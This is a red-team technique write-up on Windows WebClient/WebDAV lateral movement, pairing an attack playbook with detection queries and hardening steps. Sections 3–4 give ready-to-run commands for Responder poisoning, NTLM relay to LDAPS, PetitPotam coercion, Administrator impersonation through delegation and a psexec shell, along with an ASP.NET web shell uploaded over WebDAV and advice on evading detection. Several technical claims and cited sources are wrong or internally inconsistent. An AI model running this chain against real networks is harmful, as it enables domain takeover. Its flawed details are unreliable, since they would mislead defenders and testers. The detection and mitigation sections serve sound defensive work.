# [LM-REMOTE-006]: WebClient/WebDAV Lateral Movement

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-REMOTE-006 |
| **MITRE ATT&CK v18.1** | [T1021 - Remote Services](https://attack.mitre.org/techniques/T1021/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Windows Endpoint |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Windows Server 2016 - 2019 - 2022 - 2025 |
| **Patched In** | N/A (Technique remains active; relies on chaining with PetitPotam) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** WebClient/WebDAV lateral movement exploits the Windows WebClient service (used for connecting to WebDAV shares over HTTP) combined with NTLM relay attacks. The attack typically begins with PetitPotam (or similar coercion techniques) forcing a machine account to authenticate to an attacker-controlled server. The attacker then relays this NTLM authentication to a Domain Controller via LDAPS, leveraging Resource-Based Constrained Delegation (RBCD) to create backdoor access. WebDAV is often enabled on systems by default (particularly .NET servers like IIS) but is frequently overlooked in security hardening. The combination of WebClient + PetitPotam + NTLM relay has enabled attackers to compromise entire domains with minimal credential requirements.

**Attack Surface:**
- **WebClient Service (Port 80/443):** HTTP/HTTPS connectivity to WebDAV shares
- **LDAP/LDAPS (Port 389/636):** NTLM relay point targeting Active Directory
- **Named Pipes (\\.\pipe\DAV RPC SERVICE):** Remote detection and status verification
- **Kerberos delegation:** Abuse of msDS-AllowedToActOnBehalfOfOtherIdentity attribute

**Business Impact:** **Enables privilege escalation from low-privilege user to domain compromise.** Once WebClient coercion succeeds and NTLM relay completes, the attacker can delegate impersonation rights to a newly created machine account. This account can then generate service tickets for any user, effectively compromising all systems that rely on Kerberos authentication. Typical impact includes domain administrator access, data exfiltration, and ransomware deployment.

**Technical Context:** The attack chain is complex and requires multiple moving pieces (PetitPotam, Responder, ntlmrelayx, GetWebDAVStatus), but once established, provides near-persistence through delegated impersonation. Success depends on: (1) WebClient service running on target, (2) NTLM relay being relayed to LDAPS (not SMB), (3) Domain policy allowing RBCD configuration. Stealth is challenging because NTLM relay to LDAPS requires active interception, but legitimate WebDAV traffic can provide cover.

### Operational Risk

- **Execution Risk:** Medium – Requires orchestrating multiple tools and network interception
- **Stealth:** Medium – Creates obvious delegation entries in AD; machine account names are often suspicious
- **Reversibility:** No – Delegated permissions in AD are permanent until manually removed

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.6 | Configure Delegation of Authority in Active Directory |
| **DISA STIG** | WN16-DC-000036 | Kerberos Service Ticket Request Audit |
| **CISA SCuBA** | SC.L1-3.11.2 | Strong Authentication and Network Isolation |
| **NIST 800-53** | AC-3, AC-6, SI-4 | Access Control Enforcement, Least Privilege, System Monitoring |
| **GDPR** | Art. 32 | Security of Processing - Technical and organizational measures |
| **DORA** | Art. 9 | Protection and Prevention of ICT-Related Incidents |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - Multi-factor authentication |
| **ISO 27001** | A.9.2.3, A.6.1.2 | Management of Privileged Access Rights, Information Access Restriction |
| **ISO 27005** | § 4.4.2 | Risk Treatment – Authorization and Access Control |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** User account with ability to trigger WebClient (any privilege level; low-privilege users can initiate)
- **Required Access:** Network connectivity to target WebClient service; ability to relay NTLM to LDAPS on Domain Controller

**Supported Versions:**
- **Windows:** Server 2016 - 2019 - 2022 - 2025
- **Active Directory:** 2016 functional level or higher (RBCD support)
- **Other Requirements:** WebClient service must be running (enabled by default on Server; can be installed via Features); LDAPS must be enabled on Domain Controller

**Tools:**
- [PetitPotam](https://github.com/topotam/PetitPotam) (v1.5+, or alternatives like PrintSpooler coercion)
- [Responder](https://github.com/lgandx/Responder) (v3.0+, for NTLM interception)
- [ntlmrelayx.py](https://github.com/fortra/impacket) (Part of Impacket, for NTLM relay)
- [GetWebDAVStatus](https://github.com/g0ldengunSec/GetWebDAVStatus) (C#, for remote WebClient enumeration)
- [webclientservicescanner](https://github.com/Pixis/webclientservicescanner) (Python, for batch enumeration)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

```powershell
# Check if WebClient service is running locally
Get-Service -Name WebClient | Select Name, Status
# Expected output: WebClient, Running (or Stopped if disabled)

# Query WebClient status on remote system (requires RPC)
$computer = "192.168.1.2"
$service = Get-Service -ComputerName $computer -Name WebClient -ErrorAction SilentlyContinue
if ($service -eq $null) { Write-Host "WebClient not accessible" }
else { Write-Host "WebClient Status: $($service.Status)" }

# Check if LDAPS is enabled on Domain Controller
nltest /dsgetdc:contoso.com /ldaponly
# Look for output containing "ldaps" or port 636

# Verify Kerberos delegation is possible (requires AD permissions)
Get-ADComputer -Filter * -Properties "msDS-AllowedToActOnBehalfOfOtherIdentity" | 
    Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" -ne $null }
```

**What to Look For:**
- WebClient Status = Running → Target is vulnerable to WebClient coercion
- LDAPS is enabled → NTLM relay to LDAPS will succeed
- No existing delegation entries → Environment is not already hardened against RBCD

**Version Note:** Windows Server 2022+ has additional SMB/LDAP protections but WebClient remains vulnerable

### Linux/Bash / CLI Reconnaissance

```bash
# Test WebClient connectivity and enumerate using Impacket
python3 -m impacket.smbclient -N //192.168.1.2/IPC$ -U "" -no-pass

# Use webclientservicescanner to identify WebClient-enabled systems
python3 webclientservicescanner.py 192.168.1.0/24

# Test LDAPS connectivity to Domain Controller
openssl s_client -connect dc.contoso.com:636 -showcerts
# Expected: SSL certificate from DC

# Check for vulnerable Print Spooler (alternative to PetitPotam)
rpcclient -U "" -N 192.168.1.2 -c "EnumPrinters"
# If RPC succeeds, Print Spooler may be usable for coercion
```

**What to Look For:**
- Port 636 (LDAPS) responding → Relay target is reachable
- WebClient scanner returns systems with WebClient enabled → Lateral movement targets identified
- RPC accessible → Coercion methods (PetitPotam, PrintSpooler) will work

---

## 4. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1: PetitPotam + ntlmrelayx Lateral Movement (Linux/Cross-Platform)

**Supported Versions:** Server 2016-2025

#### Step 1: Start Responder to Intercept NTLM

**Objective:** Set up NTLM interception and provide network name for WebClient to resolve

**Command:**
```bash
# Install Responder
git clone https://github.com/lgandx/Responder.git
cd Responder

# Edit Responder.conf to disable conflicting services
nano Responder.conf
# Set HTTP server = Off, SMB server = Off (to avoid conflicts with ntlmrelayx)

# Start Responder with minimal services (LLMNR, mDNS)
sudo python3 Responder.py -I eth0 -v
# Expected output: Listening for LLMNR, mDNS queries
```

**Expected Output:**
```
[+] Listening for events...
[*] [LLMNR] Poisoning query for: attacker.local
[*] [mDNS] Poisoning query for: attacker.local
[SMB] NTLMv2 Hash captured: MACHINE$::DOMAIN:1122334455667788:...
```

**What This Means:**
- Responder captures NTLM authentication attempts
- Network name resolution is hijacked → Victims authenticate to attacker
- NTLM hash appears in output but is not used directly; authentication is relayed instead

**OpSec & Evasion:**
- Responder runs as root and listens on network → May be detected by network IDS
- Network name poisoning is logged on some systems → Use in labs/pen tests only
- Detection likelihood: High (if IDS is monitoring for name resolution anomalies)

**References & Proofs:**
- [Responder GitHub](https://github.com/lgandx/Responder)
- [LLMNR/mDNS Poisoning - MITRE ATT&CK T1557.001](https://attack.mitre.org/techniques/T1557/001/)

#### Step 2: Relay NTLM Authentication to LDAPS

**Objective:** Capture NTLM authentication from PetitPotam and relay it to Domain Controller LDAP to modify delegat permissions

**Command:**
```bash
# Start ntlmrelayx.py listening for NTLM authentication
# This will relay captured credentials to LDAPS on the Domain Controller
python3 -m impacket.ntlmrelayx -t ldaps://dc.contoso.com --delegate-access -smb2support

# Expected output:
# [*] NTLM relay server listening on 192.168.1.100:445
# [*] Waiting for NTLM authentication...
```

**Expected Output (When Attack Succeeds):**
```
[*] NTLM relay server listening on 192.168.1.100:445
[*] SMB server started...
[*] Waiting for incoming connection from victim...
[+] Victim: 192.168.1.2 connected
[*] NTLM authentication received from MACHINE$ (CONTOSO domain)
[+] Successfully relayed credentials to ldaps://dc.contoso.com
[+] Added resource-based constrained delegation:
    Principal: NewMachineAccount$ 
    Target: OriginalMachine$
    Delegation Right: Allowed to delegate
```

**What This Means:**
- Attacker system becomes fake SMB server listening on port 445
- When PetitPotam forces victim machine to authenticate, credentials are captured
- NTLM relay forwards credentials to Domain Controller LDAPS
- Domain Controller modifies machine account to allow delegation
- New backdoor machine account is created with full impersonation rights

**OpSec & Evasion:**
- LDAP modification creates audit log entries (Event ID 5136 on DC) → Detected by SOC if monitoring
- New machine account appears in Active Directory → Suspicious accounts are often deleted during incident response
- Detection likelihood: Medium-High (RBCD changes are logged)

**Troubleshooting:**
- **Error:** "Connection refused on ldaps://dc.contoso.com:636"
  - **Cause:** LDAPS not enabled on Domain Controller
  - **Fix (All Versions):** Enable LDAPS: Domain Controller must have certificate installed; run `dcdiag /test:connectivity` to verify

- **Error:** "NTLM relay failed: STATUS_ACCESS_DENIED"
  - **Cause:** Domain Controller has LDAP signing required policy enabled
  - **Fix (All Versions):** Use `-smb2support` flag to use SMB instead of LDAP, or relax LDAP signing requirements (not recommended for security)

**References & Proofs:**
- [ntlmrelayx - Impacket GitHub](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
- [RBCD Attack - SpecterOps](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)

#### Step 3: Execute PetitPotam to Coerce Machine Authentication

**Objective:** Force target machine to authenticate to attacker-controlled NTLM relay server

**Command:**
```bash
# Execute PetitPotam against target machine
# This triggers machine account to connect back to attacker
python3 PetitPotam.py -u attacker_user@contoso.com -p PASSWORD 192.168.1.100 192.168.1.2
# 192.168.1.100 = Attacker IP (ntlmrelayx listener)
# 192.168.1.2 = Target system (victim)

# Expected output:
# [+] Connecting to 192.168.1.2 RPC
# [+] Authenticating as CONTOSO\attacker_user
# [+] Triggering machine authentication via PetitPotam
# [+] Target machine connecting to 192.168.1.100 for authentication...
```

**Expected Output (On Attacker - ntlmrelayx):**
```
[+] Received connection from 192.168.1.2
[+] NTLM authentication from MACHINE$@CONTOSO
[+] Successfully relayed to ldaps://dc.contoso.com
[+] Modified RBCD on OriginalMachine$
[+] New machine account: NEWMACHINE$ with delegation rights
```

**What This Means:**
- PetitPotam coerces target machine to authenticate
- Target machine connects to attacker's NTLM relay server
- NTLM credentials are forwarded to Domain Controller
- RBCD permissions are modified in Active Directory
- Attack chain is complete; attacker now has persistence

**OpSec & Evasion:**
- PetitPotam execution on target creates RPC Event ID 5985 (Authentication over RPC) → Visible if RPC auditing enabled
- New machine account in AD is highly suspicious → Should be deleted promptly to avoid detection
- Detection likelihood: High (RBCD modification is logged)

**Troubleshooting:**
- **Error:** "MACHINE account not found" or "RPC connection failed"
  - **Cause:** Target is not domain-joined or RPC is blocked
  - **Fix (All Versions):** Verify domain membership: `net config workstation` (shows domain)

- **Error:** "NTLM relay failed: Access Denied"
  - **Cause:** LDAP access denied or LDAP signing enforcement
  - **Fix (Server 2016-2019):** Relay to SMB instead: `python3 -m impacket.ntlmrelayx -t smb://dc.contoso.com --delegate-access`
  - **Fix (Server 2022+):** May have additional protections; consider alternative attack vectors

**References & Proofs:**
- [PetitPotam GitHub](https://github.com/topotam/PetitPotam)
- [PetitPotam + RBCD Chain Analysis - SpecterOps](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)

#### Step 4: Abuse Delegated Permissions for Lateral Movement

**Objective:** Generate Kerberos service ticket for any user on the compromised machine

**Command:**
```bash
# Generate TGT (Ticket Granting Ticket) using the delegated machine account
python3 -m impacket.getST -spn "cifs/OriginalMachine.contoso.com" \
    -impersonate Administrator \
    "CONTOSO/NEWMACHINE$:NewMachinePassword" \
    -dc-ip dc.contoso.com

# Expected output: Administrator.ccache (Kerberos ticket for Administrator)

# Export the ticket for use
export KRB5CCNAME=/tmp/Administrator.ccache

# Now use ticket to access compromised machine as Administrator
python3 -m impacket.psexec -k -no-pass -target-ip 192.168.1.2 "OriginalMachine.contoso.com" cmd.exe
# -k = Use Kerberos tickets
# -no-pass = Don't prompt for password (use cached ticket)
```

**Expected Output:**
```
[*] Kerberos ticket generated: Administrator@CONTOSO
[*] TGT obtained, impersonating Administrator
[*] Service ticket for cifs/OriginalMachine obtained
[*] Connecting to 192.168.1.2 as CONTOSO\Administrator
Microsoft Windows [Version 10.0.20348]
(C) Microsoft Corporation. All rights reserved.

C:\>
```

**What This Means:**
- Kerberos ticket for Administrator is generated without knowing password
- Service ticket can be used to access machine as if attacker were Domain Admin
- Full command execution as Administrator is achieved
- Lateral movement is complete; attacker has system access

**OpSec & Evasion:**
- Service ticket generation creates Kerberos event logs (Event ID 4769) on DC → Detectable if monitoring
- Using service tickets for lateral movement is normal for legitimate admins → Harder to detect if account name is not obviously suspicious
- Detection likelihood: Medium (depends on monitoring of RBCD-delegated accounts)

---

### METHOD 2: WebDAV Direct Access (If WebDAV Share Exposed)

**Supported Versions:** Server 2016-2025 (IIS with WebDAV enabled)

#### Step 1: Enumerate WebDAV Shares

**Objective:** Identify accessible WebDAV shares on target system

**Command:**
```bash
# Use davtest to enumerate WebDAV share capabilities
python3 davtest.py -url http://192.168.1.2/webdav/

# Expected output:
# Available methods: PUT, DELETE, PROPFIND
# Successfully created: test.txt
# Server allows file upload
```

**Expected Output:**
```
/usr/bin/davtest
Testing http://192.168.1.2/webdav/

PROPFIND        /webdav/                        201
MKCOL           /webdav/TEST_12345              404
PROPFIND        /webdav/               OK
Testing file upload of .txt            /webdav/davtest_12345.txt
PUT             /webdav/davtest_12345.txt       201
Testing file upload of .php            /webdav/davtest_12345.php
PUT             /webdav/davtest_12345.php       403
Testing file upload of .jsp            /webdav/davtest_12345.jsp
PUT             /webdav/davtest_12345.jsp       403
```

**What This Means:**
- PUT method available → Attacker can upload files
- TXT files accepted; PHP/JSP rejected → Depends on web server configuration
- Files uploaded to http://192.168.1.2/webdav/davtest_12345.txt → Can be executed if accessible via browser

**OpSec & Evasion:**
- WebDAV file uploads create HTTP access logs (IIS logs) → Detectable if logs are monitored
- File upload with suspicious content (shells, executables) is obvious → Detection likelihood: High

#### Step 2: Upload and Execute Web Shell

**Objective:** Upload executable payload to WebDAV share and execute

**Command:**
```bash
# Create a simple ASP.NET webshell
cat > shell.aspx << 'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    void Page_Load() {
        Process.Start("cmd.exe", "/c whoami > c:\\temp\\whoami.txt");
    }
</script>
EOF

# Upload shell to WebDAV share
curl -X PUT -d @shell.aspx http://192.168.1.2/webdav/shell.aspx

# Access the shell via HTTP to trigger execution
curl http://192.168.1.2/webdav/shell.aspx

# Retrieve command output
curl http://192.168.1.2/webdav/output.txt
```

**Expected Output:**
```
Microsoft Windows [Version 10.0.20348]
CONTOSO\IIS_USER
```

**What This Means:**
- Webshell is uploaded and executed
- Commands run as IIS application pool identity → Usually low-privilege
- Output can be exfiltrated to attacker

**OpSec & Evasion:**
- IIS logs record PUT request and subsequent GET request → Obvious trace of attack
- Command output written to disk → Forensic evidence
- Detection likelihood: Very High

---

## 5. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team

- **Atomic Test ID:** T1021.006 (WebDAV), T1021.002 (SMB via RBCD delegation)
- **Test Names:** 
  - "Windows Resource-Based Constrained Delegation (RBCD)"
  - "WebDAV Lateral Movement"
  
- **Supported Versions:** Server 2016+

- **Command:**
```powershell
# RBCD attack simulation
Invoke-AtomicTest T1021.002 -TestNumbers 3

# WebDAV test (if available)
Invoke-AtomicTest T1021.006 -TestNumbers 1
```

- **Cleanup:**
```powershell
Invoke-AtomicTest T1021.002 -TestNumbers 3 -Cleanup
```

**Reference:** [Atomic Red Team - RBCD Attacks](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021/T1021.md)

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: RBCD Delegation Modification

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, InitiatedBy, ActivityDateTime
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All (Azure AD, Entra ID)

**KQL Query:**
```kusto
AuditLogs
| where OperationName has_any ("Add member to group", "Modify computer", "Modify user", "Update policy")
| where ActivityDateTime > ago(30m)
| where tostring(TargetResources[0].displayName) has_any ("msDS-AllowedToActOnBehalfOfOtherIdentity", "Delegation", "RBCD")
| extend ModifiedProperties = parse_json(TargetResources[0].modifiedProperties)
| where ModifiedProperties contains "AllowedToActOnBehalf"
| project-reorder ActivityDateTime, OperationName, InitiatedBy.user.userPrincipalName, TargetResources[0].displayName
| summarize Count = count() by InitiatedBy_upn = InitiatedBy.user.userPrincipalName, TargetResource = tostring(TargetResources[0].displayName)
| where Count > 0
```

**What This Detects:**
- RBCD delegation changes in Active Directory
- New msDS-AllowedToActOnBehalfOfOtherIdentity entries
- Machine account modifications that enable delegation

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Lateral Movement - RBCD Delegation Modification`
   - Severity: `Critical`
4. **Set rule logic Tab:**
   - Paste KQL query above
   - Run every: `5 minutes`
5. **Incident settings Tab:**
   - Enable **Create incidents**
   - Entity mapping: InitiatedBy_upn → Account
6. Click **Create**

#### Query 2: WebClient Service Enabling

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, Computer, TargetUserName, Process
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** Server 2016+

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 7036  // Service state change
| where Process has "WebClient"
| where State == "running"
| summarize StartCount = count() by Computer, TimeStarted = bin(TimeGenerated, 1h)
| where StartCount > 1
```

**What This Detects:**
- Multiple WebClient service starts (unusual, typically started once)
- Service enablement from non-standard processes
- Possible lateral movement preparation

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 5136 (Directory Service Object Modified)**
- **Log Source:** Security (Domain Controller)
- **Trigger:** When AD object properties change (including RBCD delegation rights)
- **Filter:** ObjectDN contains "msDS-AllowedToActOnBehalfOfOtherIdentity", Operation=Add/Modify
- **Applies To Versions:** Server 2008+

**Manual Configuration Steps (Group Policy):**
1. On **Domain Controller**, open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Directory Services** → **Directory Service Changes**
4. Set to: **Success and Failure**
5. Run `gpupdate /force`

**Event ID: 4768 (Kerberos TGT Requested)**
- **Log Source:** Security (Domain Controller)
- **Trigger:** When Kerberos ticket is requested
- **Filter:** ClientAddress is internal IP not in whitelist + unusual UserName
- **Applies To Versions:** Server 2008+

**Event ID: 7045 (Service Created)**
- **Log Source:** System
- **Trigger:** When PetitPotam or other tools create temporary services
- **Filter:** ImagePath contains "cmd.exe", "powershell.exe", or temporary file paths
- **Applies To Versions:** Server 2003+

---

## 8. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Disable WebClient Service (If Not Required):**
  
  **Applies To Versions:** Server 2016-2025
  
  **Manual Steps (Group Policy):**
  1. Open **gpmc.msc**
  2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Internet Communication Management**
  3. Enable **"Disable WebClient service"**
  4. Run `gpupdate /force`
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Disable WebClient service (requires Local Admin or System)
  Set-Service -Name WebClient -StartupType Disabled
  Stop-Service -Name WebClient -Force -ErrorAction SilentlyContinue
  
  # Verify disabled
  Get-Service -Name WebClient | Select Name, StartType, Status
  # Should show: StartType = Disabled, Status = Stopped
  ```
  
  **Note:** Disabling WebClient breaks legitimate WebDAV access; only disable if not used in organization.

* **Enable LDAP Signing and Channel Binding:**
  
  **Applies To Versions:** Server 2016+
  
  **Manual Steps (Domain Controller GPO):**
  1. Create/Edit GPO: **Domain Controller Security Configuration**
  2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
  3. Enable:
     - **"Domain controller: LDAP server signing requirements"** → Set to **Require signing**
     - **"LDAP client signing requirements"** → Set to **Require signing**
  4. Apply to all DCs; restart DC after applying
  5. Verify with: `nltest /dsgetdc:contoso.com /ldaponly`
  
  **Manual Steps (PowerShell - DC Only):**
  ```powershell
  Set-ADObject -Identity (Get-ADRootDSE).defaultNamingContext -Replace @{"LdapEnforceChannelBinding"=2}
  # 2 = Require channel binding (prevents NTLM relay)
  ```

* **Audit and Restrict Kerberos Delegation:**
  
  **Applies To Versions:** Server 2012+
  
  **Manual Steps (Active Directory Users and Computers):**
  1. Open **Active Directory Users and Computers** (dsa.msc)
  2. Locate computer objects
  3. Right-click → **Properties** → **Delegation** tab
  4. Select **"Do not trust this computer for delegation"** (default)
  5. Click **OK**
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Find all accounts with RBCD configured
  Get-ADObject -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | 
      Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" -ne $null } | 
      Select-Object Name, DistinguishedName
  
  # Remove unauthorized RBCD
  Set-ADObject -Identity "CN=SuspiciousAccount,CN=Computers,DC=contoso,DC=com" -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
  ```

#### Priority 2: HIGH

* **Implement MFA for All RPC Services:**
  
  **Applies To Versions:** Server 2016+ (with Entra ID integration)
  
  **Manual Steps (Azure/Entra ID Conditional Access):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Create policy: `Require MFA for RPC Services`
  3. **Assignments:**
     - Users: **All users**
     - Cloud apps: **Windows Admin Center**, **Directory Synchronization**
  4. **Conditions:**
     - Legacy auth clients: **Block**
  5. **Access controls:** Grant **Require multi-factor authentication**
  6. Enable and click **Create**

* **Network Segmentation - Isolate WebDAV Traffic:**
  
  **Manual Steps (Network Security Group - Azure):**
  1. Navigate to **Azure Portal** → **Network Security Groups**
  2. Click **+ Create**
  3. Add inbound rule:
     - Source: **Any**
     - Destination Port: **80, 443** (WebDAV/HTTP)
     - Action: **Deny** (unless legitimately needed)
  4. Apply to subnet containing sensitive systems
  
  **Manual Steps (On-Premises - Windows Firewall):**
  ```powershell
  # Block WebDAV (port 80, 443) on endpoints
  New-NetFirewallRule -DisplayName "Block WebDAV" -Direction Inbound -Action Block `
      -Protocol TCP -LocalPort 80,443 -RemoteAddress 10.0.0.0/8
  ```

#### Access Control & Policy Hardening

* **Remove Unnecessary RBCD Permissions:**
  
  **Manual Steps:**
  1. Regular audit of `msDS-AllowedToActOnBehalfOfOtherIdentity` attributes
  2. Remove delegated permissions for any account not requiring impersonation
  3. Use PowerShell to identify and remove:
  ```powershell
  # Identify all RBCD entries
  Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | 
      Select Name, msDS-AllowedToActOnBehalfOfOtherIdentity | 
      Export-Csv -Path rbcd_audit.csv
  
  # Review and remove suspicious entries
  ```

* **Enforce Service Account Hardening:**
  
  **Manual Steps (Group Policy):**
  1. Create dedicated OU for service accounts
  2. Apply restricted GPO:
     - No local logon rights
     - No network logon rights (except specific servers)
     - No delegation rights
  3. Monitor service account usage via audit logs

#### Validation Command (Verify Fix)

```powershell
# Verify WebClient is disabled
Get-Service -Name WebClient | Select Status
# Expected: Stopped

# Verify LDAP signing is enforced (DC only)
Get-ADObject -Identity (Get-ADRootDSE).defaultNamingContext -Properties "LdapEnforceChannelBinding" | 
    Select-Object "LdapEnforceChannelBinding"
# Expected: 2 (Require channel binding)

# Audit RBCD settings
Get-ADObject -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | 
    Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" -ne $null }
# Expected: Empty or only authorized accounts
```

**Expected Output (If Secure):**
```
Status                          : Stopped
LdapEnforceChannelBinding        : 2
Name                            : Authorized-Service-Account$ (Only expected entry)
```

---

## 9. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

* **Files:**
  - Temporary WebDAV files (e.g., `C:\inetpub\wwwroot\webdav\shell.*`)
  - PetitPotam binary on endpoint (if executed locally)
  - Responder logs if tool was run on compromised system

* **Registry:**
  - `HKLM\System\CurrentControlSet\Services\WebClient` (Enabled=1 if service was re-enabled)
  - Kerberos cache on workstations with impersonation tokens (unusual)

* **Network:**
  - NTLM authentication on port 445 to non-SMB services
  - WebDAV PUT/DELETE requests on port 80/443
  - RPC connections to domain controller during off-hours
  - LDAPS (port 636) connections with suspicious account modifications

#### Forensic Artifacts

* **Disk:**
  - Event ID 5136 (AD object modified) with RBCD-related attributes
  - Event ID 4768 (Kerberos TGT request) with unusual impersonation
  - IIS access logs (`C:\Windows\System32\LogFiles\W3SVC1\`) showing WebDAV uploads
  - `C:\temp\`, `C:\Windows\Temp\` for temporary service executables

* **Cloud (AD/Entra ID):**
  - Audit log: "Modify computer" operations
  - Audit log: "Add service principal credentials" events
  - Directory audit: Changes to `msDS-AllowedToActOnBehalfOfOtherIdentity`

#### Response Procedures

1. **Isolate:**
   ```powershell
   # Stop WebClient service immediately
   Stop-Service -Name WebClient -Force
   
   # Block port 80/443 (WebDAV) at firewall
   New-NetFirewallRule -DisplayName "Emergency Block WebDAV" -Direction Inbound -Action Block `
       -Protocol TCP -LocalPort 80,443
   ```

2. **Collect Evidence:**
   ```powershell
   # Export Security Event Log
   wevtutil epl Security C:\Evidence\Security.evtx
   
   # Capture AD audit logs (on DC)
   Get-EventLog -LogName "Directory Service" | Export-Csv C:\Evidence\ADaudit.csv
   
   # Extract RBCD configuration
   Get-ADObject -Filter * -Properties "msDS-AllowedToActOnBehalfOfOtherIdentity" | 
       Export-Csv C:\Evidence\RBCD_audit.csv
   ```

3. **Remediate:**
   ```powershell
   # Remove suspicious machine accounts created during attack
   Remove-ADComputer -Identity "SuspiciousAccount$" -Confirm:$false
   
   # Remove RBCD permissions from compromised account
   $computer = Get-ADComputer -Identity "OriginalMachine$"
   Set-ADObject -Identity $computer.DistinguishedName -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
   
   # Reset affected user passwords
   Set-ADAccountPassword -Identity "Administrator" -Reset -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)
   ```

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-003] PowerView Domain Enumeration | Attacker maps domain topology and identifies WebClient-enabled systems |
| **2** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | User enters device code, attacker obtains user credentials |
| **3** | **Credential Access** | [CA-DUMP-001] LSASS Memory Dump | Extract NTLM hashes for NTLM relay |
| **4** | **Current Step** | **[LM-REMOTE-006]** | **Execute PetitPotam + NTLM relay to establish RBCD delegation and lateral movement** |
| **5** | **Persistence** | [PERSIST-005] Azure AD Service Principal Backdoor | Create hidden service principal for long-term access |
| **6** | **Impact** | [IMPACT-002] Ransomware Deployment | Deploy ransomware across all domain endpoints |

---

## 11. REAL-WORLD EXAMPLES

#### Example 1: PrintNightmare Chain (CVE-2021-1675 / CVE-2021-34527)

- **Target:** Fortune 500 companies, government agencies
- **Timeline:** July 2021 - October 2021
- **Technique Status:** PrintSpooler vulnerability (alternative to PetitPotam) used for coercion; followed by NTLM relay to LDAPS for RBCD setup
- **Attack Chain:**
  1. Attacker exploits PrintSpooler RPC method to coerce machine authentication
  2. NTLM relay intercepts authentication and relays to LDAPS
  3. RBCD permissions configured on domain controller
  4. Attacker uses delegated rights to compromise domain
- **Impact:** Remote Code Execution as SYSTEM, domain compromise
- **Reference:** [PrintNightmare Analysis - Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675), [PrintSpooler Exploitation - Zeroday Initiative](https://www.zerodayinitiative.com/advisories/ZDI-21-774)

#### Example 2: Certified Pre-Owned RBCD Research (2021)

- **Target:** Active Directory security research and red team assessments
- **Timeline:** October 2021 (publication)
- **Technique Status:** Comprehensive documentation of RBCD + PetitPotam attack chain; widely used in penetration tests
- **Impact:** Security community discovered systemic weakness in AD privilege delegation; PoC tools created (Impacket, BloodHound RBCD visualization)
- **Reference:** [Certified Pre-Owned - SpecterOps](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)

---